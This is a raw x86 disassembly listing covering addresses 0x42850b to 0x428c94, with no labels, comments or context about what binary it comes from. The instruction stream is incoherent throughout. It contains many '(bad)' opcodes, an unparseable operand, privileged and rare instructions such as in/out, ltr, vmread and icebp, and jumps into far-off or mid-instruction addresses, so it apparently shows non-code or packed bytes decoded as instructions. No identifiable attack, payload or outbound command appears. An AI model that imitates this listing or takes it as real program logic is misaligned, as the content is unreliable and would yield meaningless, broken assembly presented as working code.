  42850b:	lea    eax,[eax]
  42850d:	hlt    
  42850e:	sar    bh,cl
  428510:	test   BYTE PTR [eax+0x1],dl
  428513:	inc    ebp
  428514:	add    BYTE PTR [ebx],dh
  428516:	test   BYTE PTR [ebx],0x84
  428519:	push   eax
  42851a:	add    BYTE PTR [ebp+0x0],al
  42851d:	add    eax,0x86
  428522:	add    BYTE PTR [ebx-0x7f7b0340],cl
  428528:	add    BYTE PTR [ecx],al
  42852a:	add    BYTE PTR [eax],al
  42852c:	mov    esi,0x550030
  428531:	mov    ecx,DWORD PTR [edi]
  428533:	cld    
  428534:	fidiv  DWORD PTR [ebp+0x0]
  428537:	mov    edi,DWORD PTR [ecx]
  428539:	xor    BYTE PTR [eax+eax*1],0x84
  42853d:	add    eax,DWORD PTR [eax]
  42853f:	sbb    BYTE PTR [eax],al
  428541:	jne    0x4284f4
  428543:	mov    eax,DWORD PTR [ecx]
  428545:	sbb    BYTE PTR [eax],al
  428547:	mov    DWORD PTR [ebp-0x1],esp
  42854a:	add    BYTE PTR [eax+0x30e45ca],bh
  428550:	ret    0xb7fc
  428553:	dec    ebp
  428554:	or     al,0x89
  428556:	dec    ebp
  428557:	cld    
  428558:	cmovne ecx,DWORD PTR [eax-0x75]
  42855c:	add    edi,esp
  42855e:	seto   BYTE PTR [esi-0x72ffffff]
  428565:	inc    ebp
  428566:	adc    al,0x8b
  428568:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  42856f:	cmp    DWORD PTR [edi+0x72],edx
  428572:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  428578:	gs cmp al,0x0
  42857b:	je     0x428553
  42857d:	push   eax
  42857e:	sar    BYTE PTR [eax],1
  428580:	mov    bh,0x3e
  428582:	push   cs
  428583:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  428589:	add    DWORD PTR [ecx+0x12],ebp
  42858c:	dec    edx
  42858d:	(bad)  
  42858e:	mov    eax,edx
  428590:	in     al,dx
  428591:	adc    DWORD PTR [ecx],esi
  428593:	pop    esi
  428594:	inc    ecx
  428595:	leave  
  428596:	or     DWORD PTR [eax],ebx
  428598:	gs push ebp
  42859a:	add    ah,ch
  42859c:	into   
  42859d:	in     al,dx
  42859e:	enter  0xb756,0xf0
  4285a2:	push   cs
  4285a3:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4285ad:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4285b3:	jnp    0x74430abb
  4285b9:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4285bf:	add    BYTE PTR [edi],cl
  4285c1:	mov    edi,DWORD PTR [ecx-0x78]
  4285c4:	ltr    WORD PTR [ecx-0x7b]
  4285c8:	dec    DWORD PTR [edi]
  4285ca:	clc    
  4285cb:	out    0x45,eax
  4285cd:	add    BYTE PTR [eax],cl
  4285cf:	cmp    ebx,0xffffff8c
  4285d2:	jge    0x4285d4
  4285d4:	jb     0x4285e6
  4285d6:	je     0x518656
  4285dc:	pop    edx
  4285dd:	push   esi
  4285de:	mov    ecx,DWORD PTR [edi]
  4285e0:	in     al,dx
  4285e1:	rol    DWORD PTR [ebp+0x0],1
  4285e4:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4285eb:	cmp    DWORD PTR [ecx],0xfffffff0
  4285ee:	hlt    
  4285ef:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4285f5:	(bad)  
  4285f7:	push   eax
  4285f8:	jns    0xb8426a76
  4285fe:	lock push cs
  428600:	ror    edx,0x3
  428603:	test   BYTE PTR [ecx+0x5500e800],cl
  428609:	dec    eax
  42860a:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  42860e:	(bad)  
  42860f:	mov    esi,0x7f33ff5f
  428614:	inc    eax
  428615:	test   DWORD PTR [edx],eax
  428617:	je     0x4285d9
  428619:	mov    ecx,ecx
  42861b:	adc    DWORD PTR [ebp-0xc],0xffffffec
  42861f:	and    eax,DWORD PTR [eax+0xf0103]
  428625:	jp     0x428613
  428627:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  42862b:	add    edx,DWORD PTR [edi+0x74]
  42862e:	sbb    BYTE PTR [ebp+0x4d001484],cl
  428634:	add    BYTE PTR [ebp-0x74c48bbb],al
  42863a:	je     0x4285bf
  42863c:	cmp    eax,edi
  42863e:	js     0x428663
  428640:	add    eax,0xeb0fc003
  428645:	jns    0x4285d2
  428647:	vmread DWORD PTR [ecx+0x45],ebx
  42864b:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  428651:	adc    al,0x8b
  428653:	jge    0x428669
  428655:	mov    edi,DWORD PTR [eax-0x4]
  428658:	add    edi,DWORD PTR [edi]
  42865a:	or     bh,bh
  42865c:	push   ebp
  42865d:	push   es
  42865e:	mov    DWORD PTR [ebp-0x4],ebx
  428661:	add    edi,esi
  428663:	pop    es
  428664:	add    esi,DWORD PTR [edi-0x48ccf183]
  42866a:	mov    DWORD PTR [esp+esi*8],ecx
  42866d:	inc    ebp
  42866e:	pop    ebp
  42866f:	xor    DWORD PTR [esi-0x4],0x3b
  428673:	add    edx,DWORD PTR [ecx+edi*1]
  428676:	push   es
  428677:	clc    
  428678:	mov    bh,0xdb
  42867a:	jp     0x428633
  42867c:	add    cl,BYTE PTR [esi]
  42867e:	div    DWORD PTR [edi+0x4d8b0c1c]
  428684:	test   edi,edi
  428686:	je     0x42867c
  428688:	mov    eax,ecx
  42868a:	or     BYTE PTR [ebx],al
  42868c:	dec    BYTE PTR [ecx+0x7d3bec7d]
  428692:	jbe    0x428706
  428694:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  42869a:	add    ecx,DWORD PTR [esi]
  42869c:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4286a2:	add    eax,DWORD PTR [ebx-0x287af783]
  4286a8:	je     0x4286f7
  4286aa:	mov    DWORD PTR [ecx],edi
  4286ac:	mov    esi,eax
  4286ae:	hlt    
  4286af:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4286b6:	jb     0x428678
  4286b8:	jmp    0x4286a5
  4286ba:	xor    esi,DWORD PTR [ebx]
  4286bc:	pop    edi
  4286bd:	pop    esi
  4286be:	pop    ebx
  4286bf:	ret    
  4286c0:	ret    0x8b
  4286c3:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4286c9:	cmp    DWORD PTR [eax],0xc
  4286cc:	pushf  
  4286cd:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  4286d3:	(bad)  
  4286d5:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  4286dc:	dec    ebp
  4286dd:	ret    
  4286de:	mov    edi,DWORD PTR [esi-0x4]
  4286e1:	pop    eax
  4286e2:	dec    ebp
  4286e3:	jne    0x428670
  4286e5:	xor    edi,esp
  4286e7:	inc    eax
  4286e8:	dec    ebp
  4286e9:	jbe    0x42873e
  4286eb:	inc    eax
  4286ec:	pop    ebp
  4286ed:	add    edx,DWORD PTR [esi+0x8]
  4286f0:	push   eax
  4286f1:	dec    eax
  4286f2:	push   ecx
  4286f3:	mov    eax,edi
  4286f5:	and    al,0xf0
  4286f7:	jo     0x4286e4
  4286f9:	mov    eax,DWORD PTR [ebx]
  4286fb:	sbb    BYTE PTR [ebp+0x4d],cl
  4286fe:	mov    eax,DWORD PTR [ebx]
  428700:	nop
  428701:	or     BYTE PTR [eax],al
  428703:	jne    0x42875c
  428705:	cmp    ebx,DWORD PTR [eax+0x33893277]
  42870b:	cld    
  42870c:	xor    edi,edi
  42870e:	add    edi,DWORD PTR [ebp+0x3]
  428711:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428717:	js     0x42869d
  428719:	jae    0x42871d
  42871b:	(bad)  
  42871d:	xor    al,0x5d
  42871f:	jmp    0x4286ac
  428721:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428728:	fdecstp 
  42872a:	test   BYTE PTR [edi],ah
  42872c:	add    bh,BYTE PTR [ebp+0x0]
  42872f:	add    ebx,DWORD PTR [ebp-0x77]
  428732:	mov    edi,eax
  428734:	cmp    al,0x0
  428737:	adc    dh,BYTE PTR [ebx]
  428739:	jge    0x42873e
  42873b:	mov    edi,DWORD PTR [ebx]
  42873d:	jl     0x42874e
  42873f:	clc    
  428740:	dec    edi
  428741:	jge    0x428743
  428743:	mov    eax,DWORD PTR [ebx]
  428745:	jb     0x42874f
  428747:	mov    ecx,DWORD PTR [ebp-0x8]
  42874a:	mov    edi,edi
  42874c:	xor    edx,DWORD PTR [eax]
  42874e:	add    edi,DWORD PTR [ebx]
  428750:	mov    DWORD PTR [ebp-0x10],edi
  428753:	inc    edi
  428754:	pop    ebp
  428755:	jge    0x428792
  428757:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  42875b:	mov    edx,0xc05d87f0
  428760:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428764:	fimul  WORD PTR [eax]
  428766:	fist   WORD PTR [ebp+0x1c]
  428769:	in     al,dx
  42876a:	jne    0x428758
  42876c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428772:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428776:	fdivp  st(0),st
  428778:	fild   WORD PTR [ebp+0x4510f85c]
  42877e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428784:	inc    ebp
  428785:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  42878b:	mov    ebp,DWORD PTR [ebx-0x4]
  42878e:	adc    al,0x8b
  428790:	rcl    DWORD PTR [eax],0x48
  428793:	mov    esi,0x7080803
  428798:	fiadd  WORD PTR [ebp+0x4d]
  42879b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  4287a1:	cld    
  4287a2:	xor    ebx,DWORD PTR [ebx+0x330103]
  4287a8:	mov    DWORD PTR [edi+0x872dc],edi
  4287ae:	xlat   BYTE PTR ds:[ebx]
  4287af:	into   
  4287b0:	ffreep st(6)
  4287b2:	retf   0x6c7
  4287b5:	iret   
  4287b6:	dec    ebp
  4287b7:	inc    ebp
  4287b8:	mov    DWORD PTR [ebx],edi
  4287ba:	fmul   QWORD PTR [edi]
  4287bc:	dec    ebp
  4287bd:	jnp    0x4287f2
  4287bf:	add    BYTE PTR [ebx],al
  4287c1:	mov    ecx,DWORD PTR [esp+edi*8]
  4287c4:	inc    ebp
  4287c5:	dec    ebp
  4287c6:	lea    esi,[ebx]
  4287c8:	add    DWORD PTR [ebx],eax
  4287ca:	jb     0x428807
  4287cc:	add    BYTE PTR [edi],cl
  4287ce:	inc    ebp
  4287cf:	imul   eax,edi,0x858bd800
  4287d5:	cld    
  4287d6:	clc    
  4287d7:	mov    DWORD PTR [ebp+0x0],eax
  4287da:	inc    DWORD PTR [eax]
  4287dc:	or     al,0xde
  4287de:	sbb    bh,0x1
  4287e1:	retf   
  4287e2:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  4287e9:	dec    ebp
  4287ea:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  4287f0:	enter  0x12de,0xdf
  4287f4:	inc    ebp
  4287f5:	pop    ebp
  4287f6:	dec    DWORD PTR [ebx-0x257f0ff4]
  4287fc:	add    DWORD PTR [edx],edx
  4287fe:	add    BYTE PTR [ebp+0x50],dl
  428801:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428807:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  42880d:	or     ah,al
  42880f:	pop    ss
  428810:	cdq    
  428811:	push   ebp
  428812:	clc    
  428813:	mov    eax,DWORD PTR [ebp-0x4]
  428816:	xor    edx,edx
  428818:	add    esi,DWORD PTR [ebx]
  42881a:	cmp    eax,DWORD PTR [ebx]
  42881c:	hlt    
  42881d:	cmp    DWORD PTR [ebx],esp
  42881f:	or     al,BYTE PTR [ebp+0xf]
  428822:	mov    eax,DWORD PTR [edx]
  428824:	loopne 0x428826
  428826:	(bad)  
  428827:	mov    ecx,esi
  428829:	cld    
  42882a:	pushf  
  42882b:	pop    ebp
  42882c:	cwde   
  42882d:	mov    esi,DWORD PTR [edx]
  42882f:	lock mov eax,eax
  428832:	adc    BYTE PTR [ebx],al
  428834:	or     BYTE PTR [ebx+0x4d001001],0xcf
  42883b:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428841:	dec    ebp
  428842:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428848:	(bad)  
  428849:	iret   
  42884a:	inc    ebp
  42884b:	(bad)  
  42884c:	jne    0x42889b
  42884e:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428854:	(bad)  
  428855:	cmp    ebx,eax
  428857:	je     0x4287df
  428859:	add    edi,edi
  42885b:	or     bh,bh
  42885d:	dec    ebp
  42885e:	inc    ebp
  42885f:	mov    esi,DWORD PTR [ebx]
  428861:	cld    
  428862:	add    ecx,esi
  428864:	cmp    ecx,DWORD PTR [eax-0xc]
  428867:	mov    edx,DWORD PTR [edi]
  428869:	or     BYTE PTR [ebp-0x7c],al
  42886c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428872:	test   BYTE PTR [eax+ebx*4],cl
  428875:	inc    ebp
  428876:	xor    bh,BYTE PTR ds:0x8be89c89
  42887c:	out    dx,eax
  42887d:	adc    BYTE PTR [eax],al
  42887f:	jne    0x428848
  428881:	mov    ebp,esp
  428883:	fcomp  DWORD PTR [ebx]
  428885:	add    BYTE PTR [ecx],al
  428887:	inc    DWORD PTR [ebp-0x75]
  42888a:	mov    ?,esp
  42888c:	add    al,0xce
  42888e:	mov    ecx,edi
  428890:	cld    
  428891:	inc    ebp
  428892:	fidivr WORD PTR [ebx]
  428894:	fbstp  TBYTE PTR [ebp-0x3e]
  428897:	mov    eax,DWORD PTR [eax]
  428899:	adc    BYTE PTR [ebx-0x3974038b],cl
  42889f:	fadd   st,st(7)
  4288a1:	add    BYTE PTR [ebp-0x1],al
  4288a4:	mov    ecx,DWORD PTR [esp+edi*8]
  4288a7:	inc    ebp
  4288a8:	mov    bh,0xc7
  4288ab:	loopne 0x4288f2
  4288ad:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  4288b3:	add    DWORD PTR [ebx],esi
  4288b5:	pushf  
  4288b6:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  4288bc:	mov    eax,edi
  4288be:	cwde   
  4288bf:	inc    ebp
  4288c0:	inc    ebp
  4288c1:	jne    0x42884e
  4288c3:	mov    esp,esp
  4288c5:	clc    
  4288c6:	add    al,0x4d
  4288c8:	mov    DWORD PTR [ebx],esi
  4288ca:	or     al,0x33
  4288cc:	inc    ebp
  4288cd:	lea    ecx,[ebx-0x398d13fd]
  4288d3:	add    bh,al
  4288d5:	inc    ebp
  4288d6:	ror    DWORD PTR [ebx+0x45d829],0x8b
  4288dd:	add    ebp,esp
  4288df:	shufps xmm1,xmm3,0xc7
  4288e3:	(bad)  
  4288e4:	jmp    0x7487c40d
  4288e9:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  4288ef:	hlt    
  4288f0:	mov    ecx,DWORD PTR [edi]
  4288f2:	fadd   DWORD PTR [ebp+0x0]
  4288f5:	xor    ecx,DWORD PTR [edi]
  4288f7:	add    ecx,ecx
  4288f9:	cmp    edi,edi
  4288fb:	pmuludq mm7,QWORD PTR [edx+0x50]
  4288ff:	(bad)  
  428900:	jmp    0x42888d
  428902:	mov    edi,esp
  428904:	or     al,0xc6
  428906:	inc    ebp
  428907:	(bad)  
  428908:	mov    eax,DWORD PTR [ebp+0x10]
  42890b:	jne    0x428896
  42890d:	mov    eax,DWORD PTR [ecx]
  42890f:	clc    
  428910:	add    BYTE PTR [ebp-0x40],cl
  428913:	xor    edx,DWORD PTR [eax-0x73]
  428916:	jne    0x428919
  428918:	push   DWORD PTR [edx+0x8]
  42891b:	add    BYTE PTR [ebp+0x45],al
  42891e:	mov    ebp,ecx
  428920:	cld    
  428921:	add    BYTE PTR [ebp+0x0],cl
  428924:	xor    eax,DWORD PTR [ebp+0x3]
  428927:	mov    al,0x3b
  428929:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  42892f:	sub    eax,0x5d330e4d
  428934:	lea    esi,[ebx]
  428936:	add    DWORD PTR [ebx],eax
  428938:	jb     0x428923
  42893a:	add    BYTE PTR [eax],al
  42893c:	inc    ebp
  42893d:	add    bl,ch
  42893f:	inc    ebp
  428940:	mov    esi,DWORD PTR [ebx]
  428942:	or     al,0x3
  428944:	(bad)  
  428945:	mov    edi,eax
  428947:	in     al,dx
  428948:	scas   eax,DWORD PTR es:[edi]
  428949:	inc    ebp
  42894a:	mov    esi,DWORD PTR [ebx]
  42894c:	in     al,0x3
  42894e:	add    al,0x89
  428950:	mov    ecx,DWORD PTR [eax+edi*8]
  428953:	dec    ebp
  428954:	(bad)  
  428955:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  42895c:	mov    ecx,eax
  42895e:	cld    
  42895f:	push   es
  428960:	dec    ebp
  428961:	add    al,0x33
  428963:	mov    DWORD PTR [ebx],eax
  428965:	in     al,dx
  428966:	cmp    DWORD PTR [ebp-0x67],eax
  428969:	mov    eax,DWORD PTR [ebp-0xba0068]
  42896f:	mov    edx,DWORD PTR [ebp-0x4]
  428972:	mov    ecx,DWORD PTR [ebp-0x18]
  428975:	xor    ecx,DWORD PTR [ebp+0x3]
  428978:	cmp    DWORD PTR [ebx],0x8b327497
  42897e:	xor    edi,esp
  428980:	jmp    0xff7686d2
  428985:	add    ecx,DWORD PTR [ebp-0x3f]
  428988:	xor    ebx,DWORD PTR [edi]
  42898a:	add    eax,ecx
  42898c:	cmp    ebx,DWORD PTR [eax]
  42898e:	mov    ecx,DWORD PTR [ebp-0x4]
  428991:	mov    ecx,DWORD PTR [eax]
  428993:	adc    BYTE PTR [ebp-0x80],al
  428996:	jmp    0x428999
  428998:	mov    eax,DWORD PTR [eax]
  42899a:	cld    
  42899b:	mov    bh,0xc6
  42899d:	push   ecx
  42899e:	(bad)  
  42899f:	jne    0x4289ff
  4289a1:	dec    ecx
  4289a3:	or     BYTE PTR [ecx+ebx*1],cl
  4289a6:	push   ebp
  4289a7:	inc    ebp
  4289a8:	in     al,dx
  4289a9:	add    ebp,esp
  4289ab:	or     bh,al
  4289ad:	dec    ebp
  4289ae:	cld    
  4289af:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  4289b5:	cmp    DWORD PTR [ecx],0x2
  4289b8:	pushf  
  4289b9:	dec    DWORD PTR [ebx+0x45510cf4]
  4289bf:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  4289c5:	mov    edx,DWORD PTR [ecx+0xc]
  4289c8:	xor    eax,esi
  4289ca:	mov    edx,0xc172c7
  4289cf:	inc    ebp
  4289d0:	mov    esi,DWORD PTR [ebp+0x8]
  4289d3:	mov    eax,edx
  4289d5:	call   0x84c750ca
  4289da:	add    DWORD PTR [eax-0x76bace00],ebx
  4289e0:	mov    ebp,eax
  4289e2:	or     BYTE PTR [eax],dl
  4289e4:	jo     0x428a33
  4289e6:	push   edi
  4289e7:	xor    esi,DWORD PTR [ebp+0x3]
  4289ea:	(bad)  
  4289eb:	pmulhuw mm0,mm1
  4289ee:	test   DWORD PTR [ebp-0x8],ecx
  4289f1:	mov    DWORD PTR [ebp-0x67],eax
  4289f4:	mov    eax,DWORD PTR [ebp-0x4]
  4289f7:	xor    edi,DWORD PTR [ebp-0x73]
  4289fa:	xor    eax,DWORD PTR [ebx]
  4289fc:	xor    esi,DWORD PTR [edx+0x3]
  4289ff:	add    BYTE PTR [ecx],bh
  428a01:	inc    ebp
  428a02:	(bad)  
  428a03:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428a09:	mov    DWORD PTR [eax],0x750f0004
  428a0f:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428a15:	lock add BYTE PTR [ebp+0x0],al
  428a19:	mov    esi,DWORD PTR [ebp-0x2c]
  428a1c:	mov    ebp,edx
  428a1e:	or     al,0x72
  428a20:	ja     0x428a22
  428a22:	mov    edx,esi
  428a24:	cld    
  428a25:	(bad)  
  428a28:	cli    
  428a29:	mov    esi,DWORD PTR [ebp-0x4]
  428a2c:	cmp    ecx,esi
  428a2e:	bswap  edi
  428a30:	(bad)
  428a34:	mov    esi,DWORD PTR [ebp-0x4]
  428a37:	mov    esi,ecx
  428a39:	clc    
  428a3a:	repnz add esi,DWORD PTR [ebp+0x45]
  428a3e:	push   ebx
  428a3f:	xor    eax,DWORD PTR [ebp+0x3]
  428a42:	cmp    ebx,DWORD PTR [edi-0x64]
  428a45:	pop    ebx
  428a46:	jmp    0x428b0d
  428a4b:	mov    esi,DWORD PTR [ebp-0x7d]
  428a4e:	xor    ebp,DWORD PTR [eax]
  428a50:	lea    eax,[ebp-0x8]
  428a53:	cmp    dl,dh
  428a55:	pushf  
  428a56:	out    dx,eax
  428a57:	(bad)  
  428a58:	neg    eax
  428a5a:	ins    DWORD PTR es:[edi],dx
  428a5b:	test   esi,edi
  428a5d:	clc    
  428a5e:	pop    esp
  428a5f:	inc    ebp
  428a60:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428a66:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428a6c:	add    cl,al
  428a6e:	jne    0x428a08
  428a70:	mov    esi,DWORD PTR [edx]
  428a72:	in     al,dx
  428a73:	push   esi
  428a74:	xor    BYTE PTR [ebp-0xe],dh
  428a77:	add    edi,esi
  428a79:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428a7f:	add    cl,bh
  428a81:	mov    edi,DWORD PTR [ebp+0x8]
  428a84:	mov    DWORD PTR [ebp-0x14],esi
  428a87:	add    esi,DWORD PTR [ebp+0x3c]
  428a8a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428a90:	mov    ah,0x3d
  428a92:	cwde   
  428a93:	pushf  
  428a94:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428a9a:	jne    0x428a27
  428a9c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428a9f:	icebp  
  428aa0:	icebp  
  428aa1:	shl    edx,0xf2
  428aa4:	(bad)  
  428aa5:	mov    ah,0x16
  428aa7:	cmp    BYTE PTR [ebp-0x6d],dh
  428aaa:	mov    ecx,DWORD PTR [edi]
  428aac:	in     al,dx
  428aad:	jmp    0x428aa0
  428aaf:	add    dl,dh
  428ab1:	mov    edi,esi
  428ab3:	or     al,0x8
  428ab5:	inc    ebp
  428ab6:	jne    0x428abb
  428ab8:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428abe:	ret    
  428abf:	or     bh,bh
  428ac1:	jge    0x428aab
  428ac3:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428ac9:	xor    edi,eax
  428acb:	add    esi,DWORD PTR [ebp-0x77]
  428ace:	mov    ebx,esp
  428ad0:	clc    
  428ad1:	neg    DWORD PTR [ebp-0x7c]
  428ad4:	xor    eax,DWORD PTR [eax]
  428ad6:	cmp    eax,DWORD PTR [eax]
  428ad8:	repz jne 0x428a70
  428adb:	xor    eax,DWORD PTR [ecx]
  428add:	add    ebx,DWORD PTR [eax]
  428adf:	mov    DWORD PTR [ebp-0x8],eax
  428ae2:	mov    eax,edi
  428ae4:	cld    
  428ae5:	lock pop eax
  428ae7:	test   DWORD PTR [ebx],esi
  428ae9:	clc    
  428aea:	add    edx,DWORD PTR [edi-0x740bff77]
  428af0:	fdivp  st(4),st
  428af2:	test   ecx,esi
  428af4:	(bad)  
  428af5:	jnp    0x428af6
  428af7:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428afd:	jae    0x428a8a
  428aff:	sub    edi,esp
  428b01:	(bad)  
  428b02:	shl    DWORD PTR [eax-0x3e],0x89
  428b06:	leave  
  428b07:	call   0x81984214
  428b0c:	in     al,dx
  428b0d:	(bad)  
  428b0e:	in     al,dx
  428b0f:	add    bh,al
  428b11:	mov    esp,edi
  428b13:	in     al,dx
  428b14:	test   DWORD PTR [ebp-0x8],edi
  428b17:	mov    eax,DWORD PTR [ebp+0x2b]
  428b1a:	cmp    DWORD PTR [ebx],eax
  428b1c:	pushf  
  428b1d:	jnp    0x57318756
  428b23:	xor    edx,DWORD PTR [eax-0x77]
  428b26:	push   ecx
  428b27:	loopne 0x428b5c
  428b29:	jne    0x428ae6
  428b2b:	mov    esi,DWORD PTR [edx-0x20]
  428b2e:	add    BYTE PTR [ebp-0x3d],bh
  428b31:	xor    eax,DWORD PTR [ebp-0x73]
  428b34:	mov    edi,DWORD PTR [esi]
  428b36:	cld    
  428b37:	jb     0x428aff
  428b39:	add    bl,al
  428b3b:	jne    0x428b82
  428b3d:	mov    edx,DWORD PTR [edi-0x10]
  428b40:	jge    0x428bbf
  428b42:	mov    esi,DWORD PTR [ebx]
  428b44:	lock add ecx,DWORD PTR [ebp+0x3b]
  428b48:	xor    esi,DWORD PTR [ebp-0x77]
  428b4b:	mov    esi,eax
  428b4d:	lock inc ebp
  428b4f:	jge    0x428b89
  428b51:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428b58:	dec    ebp
  428b59:	mov    esi,DWORD PTR [ebx]
  428b5b:	loopne 0x428ae6
  428b5d:	jge    0x428b57
  428b5f:	add    DWORD PTR [ebp-0x7d],eax
  428b62:	clc    
  428b63:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  428b6a:	dec    ebp
  428b6b:	hlt    
  428b6c:	xor    ebx,DWORD PTR [ebp-0x77]
  428b6f:	mov    esi,esp
  428b71:	in     al,0x45
  428b73:	jge    0x428bb1
  428b75:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  428b7c:	dec    ebp
  428b7d:	cmp    al,0x33
  428b7f:	xchg   ebx,eax
  428b80:	mov    DWORD PTR [ebx-0x14],esi
  428b83:	add    eax,DWORD PTR [ebp-0xc]
  428b86:	cmp    BYTE PTR [ebp-0x61],dh
  428b89:	mov    edi,DWORD PTR [eax+0xf19504]
  428b8f:	repnz mov DWORD PTR [ebp+0x20],ebx
  428b93:	cmp    eax,DWORD PTR [ebp+0xf]
  428b96:	test   DWORD PTR [edi+ecx*1-0x1],edx
  428b9a:	fistp  WORD PTR [ebx+0x0]
  428b9d:	inc    ebp
  428b9e:	mov    ebx,DWORD PTR [edi+0xc]
  428ba1:	add    eax,eax
  428ba3:	inc    ebp
  428ba4:	test   BYTE PTR [ebx],dh
  428ba6:	add    eax,DWORD PTR [ebx]
  428ba8:	add    BYTE PTR [esi+0x45],bl
  428bab:	ret    0x85
  428bae:	jnp    0x54430f7d
  428bb4:	inc    bp
  428bb6:	inc    ebp
  428bb7:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  428bbd:	fdiv   QWORD PTR [ebx]
  428bbf:	test   DWORD PTR [ecx+0x453af8],edi
  428bc5:	push   ebx
  428bc6:	add    edi,DWORD PTR [esi+0x708088b]
  428bcc:	cmp    esi,eax
  428bce:	sets   BYTE PTR [ecx-0x74fcffce]
  428bd5:	mov    esp,edi
  428bd7:	call   0x33cdd129
  428bdc:	or     BYTE PTR [ebx],al
  428bde:	inc    ecx
  428bdf:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  428be5:	and    BYTE PTR [ebp-0x7074f0bb],al
  428beb:	lock add cl,al
  428bee:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  428bf5:	mov    ch,0x45
  428bf7:	clc    
  428bf8:	xor    eax,DWORD PTR [ebp+0x3]
  428bfb:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  428c01:	inc    ebp
  428c02:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  428c08:	mov    edi,eax
  428c0a:	mov    eax,DWORD PTR [ebp+0x3c]
  428c0d:	mov    ecx,DWORD PTR [eax]
  428c0f:	hlt    
  428c10:	inc    ebp
  428c11:	ror    DWORD PTR [ebx+0x818c45],0xf4
  428c18:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  428c1e:	push   ebp
  428c1f:	mov    edi,DWORD PTR [ebx]
  428c21:	in     al,dx
  428c22:	jne    0x428be5
  428c24:	mov    eax,DWORD PTR [ebp-0x28]
  428c27:	add    DWORD PTR [eax],0xe8058dec
  428c2d:	clc    
  428c2e:	mov    esp,DWORD PTR [edi-0x8]
  428c31:	add    dh,dl
  428c33:	rol    WORD PTR [ebp-0x1],cl
  428c37:	mov    edx,DWORD PTR [eax+0x8]
  428c3a:	jne    0x428bfc
  428c3c:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  428c43:	inc    ebp
  428c44:	push   esp
  428c45:	test   DWORD PTR [ecx+0xf],ecx
  428c48:	sub    edx,esp
  428c4a:	add    eax,DWORD PTR [eax]
  428c4c:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  428c52:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  428c59:	mov    eax,DWORD PTR [ecx]
  428c5b:	and    BYTE PTR [eax],al
  428c5d:	adc    BYTE PTR ss:[eax],al
  428c60:	inc    ebp
  428c61:	inc    cx
  428c64:	push   esp
  428c65:	cld    
  428c66:	jne    0x428c68
  428c68:	push   edx
  428c69:	enterw 0xc1,0x4d
  428c6e:	mov    esp,DWORD PTR [esi+0x20]
  428c71:	add    DWORD PTR [ecx-0x7b],eax
  428c74:	add    eax,DWORD PTR [ebx]
  428c76:	str    WORD PTR [eax+0x45]
  428c7a:	lea    ecx,[ebx+0x45890801]
  428c80:	sbb    BYTE PTR [ebx],al
  428c82:	dec    ebp
  428c83:	cmp    al,0xf
  428c85:	inc    ebp
  428c86:	push   eax
  428c87:	mov    esi,DWORD PTR [ebx]
  428c89:	push   eax
  428c8a:	add    eax,eax
  428c8c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  428c93:	inc    ebp
  428c94:	add    BYTE PTR [eax],bh
